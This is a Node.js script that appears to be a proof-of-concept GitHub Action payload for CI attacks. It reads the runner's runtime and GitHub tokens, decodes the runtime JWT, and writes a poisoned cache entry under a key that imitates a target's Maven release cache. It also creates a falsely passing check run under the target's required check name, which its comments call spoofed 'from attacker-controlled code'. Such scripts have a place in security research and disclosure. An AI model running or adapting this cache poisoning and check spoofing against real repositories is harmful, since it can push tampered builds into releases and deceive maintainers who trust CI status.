const http = require('http');
const https = require('https');
const crypto = require('crypto');

function makeRequest(url, options, body) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);
    const reqOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port,
      path: parsedUrl.pathname + parsedUrl.search,
      ...options,
      headers: {
        ...options.headers,
        'User-Agent': 'cache-test-action'
      }
    };
    const req = (parsedUrl.protocol === 'https:' ? https : http).request(reqOptions, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

async function run() {
  const cacheUrl = process.env['ACTIONS_CACHE_URL'];
  const runtimeToken = process.env['ACTIONS_RUNTIME_TOKEN'];
  const resultsUrl = process.env['ACTIONS_RESULTS_URL'];
  const token = process.env['GITHUB_TOKEN'];
  const repo = process.env['GITHUB_REPOSITORY'];
  const sha = process.env['GITHUB_SHA'];

  console.log('=== Token Availability ===');
  console.log(`ACTIONS_CACHE_URL: ${cacheUrl || 'NOT SET'}`);
  console.log(`ACTIONS_RUNTIME_TOKEN: [SET, length=${(runtimeToken||'').length}]`);
  console.log(`ACTIONS_RESULTS_URL: ${resultsUrl || 'NOT SET'}`);
  console.log(`GITHUB_EVENT_NAME: ${process.env['GITHUB_EVENT_NAME']}`);

  // Decode the runtime token JWT to check scope
  if (runtimeToken) {
    try {
      const parts = runtimeToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      console.log('\n=== Runtime Token JWT Claims ===');
      console.log(`ac (action cache): ${JSON.stringify(payload.ac)}`);
      console.log(`scp (scope): ${payload.scp}`);
      console.log(`iss: ${payload.iss}`);
      console.log(`sub: ${payload.sub}`);
      // Print all cache-related claims
      for (const [k,v] of Object.entries(payload)) {
        if (k.includes('cache') || k.includes('Cache') || k === 'ac' || k === 'permissions') {
          console.log(`  ${k}: ${JSON.stringify(v)}`);
        }
      }
    } catch(e) {
      console.log(`JWT decode error: ${e.message}`);
    }
  }

  if (cacheUrl && runtimeToken) {
    // The version needs to be a proper SHA256 hash
    // actions/cache computes it as SHA256 of: paths | compressionMethod | os
    const version = crypto.createHash('sha256').update('~/.m2/repository||Linux').digest('hex');
    console.log(`\n=== Cache API Test (version: ${version}) ===`);

    // Try to reserve a cache with a key matching the target's Maven Central Release key
    const testKey = 'Linux-maven-Maven Central Release-poisoned-test-v2';
    const reserveBody = JSON.stringify({ key: testKey, version: version });
    
    console.log(`\nReserving cache with key: ${testKey}`);
    const reserveResp = await makeRequest(
      `${cacheUrl}_apis/artifactcache/caches`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${runtimeToken}`,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(reserveBody)
        }
      },
      reserveBody
    );

    console.log(`Reserve Status: ${reserveResp.status}`);
    console.log(`Reserve Body: ${reserveResp.body.substring(0, 500)}`);

    if (reserveResp.status === 201) {
      const parsed = JSON.parse(reserveResp.body);
      console.log(`Cache ID: ${parsed.cacheId}`);
      
      // Upload content
      const content = Buffer.from('POISONED_MAVEN_CACHE_TEST_CONTENT');
      const uploadResp = await makeRequest(
        `${cacheUrl}_apis/artifactcache/caches/${parsed.cacheId}`,
        {
          method: 'PATCH',
          headers: {
            'Authorization': `Bearer ${runtimeToken}`,
            'Content-Type': 'application/octet-stream',
            'Content-Range': `bytes 0-${content.length - 1}/*`,
            'Content-Length': content.length
          }
        },
        content
      );
      console.log(`Upload Status: ${uploadResp.status}`);

      // Finalize
      const finalBody = JSON.stringify({ size: content.length });
      const finalResp = await makeRequest(
        `${cacheUrl}_apis/artifactcache/caches/${parsed.cacheId}`,
        {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${runtimeToken}`,
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(finalBody)
          }
        },
        finalBody
      );
      console.log(`Finalize Status: ${finalResp.status}`);
      console.log(`Finalize Body: ${finalResp.body.substring(0, 200)}`);
      
      if (finalResp.status === 204 || finalResp.status === 200) {
        console.log('\nSUCCESS: Arbitrary cache key written!');
      }
    } else if (reserveResp.status === 403) {
      console.log('\nBLOCKED: Cache is read-only (untrusted trigger mitigation)');
    } else if (reserveResp.status === 409) {
      console.log('\nCONFLICT: Cache key already exists');
    }

    // Query existing caches
    console.log('\n=== Querying caches ===');
    const queryResp = await makeRequest(
      `${cacheUrl}_apis/artifactcache/cache?keys=${encodeURIComponent(testKey)}&version=${version}`,
      {
        method: 'GET',
        headers: { 'Authorization': `Bearer ${runtimeToken}` }
      }
    );
    console.log(`Query Status: ${queryResp.status}`);
    console.log(`Query Body: ${queryResp.body.substring(0, 500)}`);
  }

  // Test check run creation
  if (token && repo && sha) {
    console.log('\n=== Check Run Creation Test ===');
    const checkBody = JSON.stringify({
      name: 'Build Test Report',  // Same name as target's required check
      head_sha: sha,
      status: 'completed',
      conclusion: 'success',
      output: {
        title: 'All tests passed (spoofed)',
        summary: 'This check was spoofed via checks:write from attacker-controlled code'
      }
    });

    const checkResp = await makeRequest(
      `https://api.github.com/repos/${repo}/check-runs`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Accept': 'application/vnd.github+json',
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(checkBody)
        }
      },
      checkBody
    );
    console.log(`Check Run Status: ${checkResp.status}`);
    if (checkResp.status === 201) {
      const parsed = JSON.parse(checkResp.body);
      console.log(`Created check run: ${parsed.id}, name: ${parsed.name}, app: ${parsed.app?.slug}`);
    }
  }
}

run().catch(err => { console.error('Error:', err); process.exit(1); });
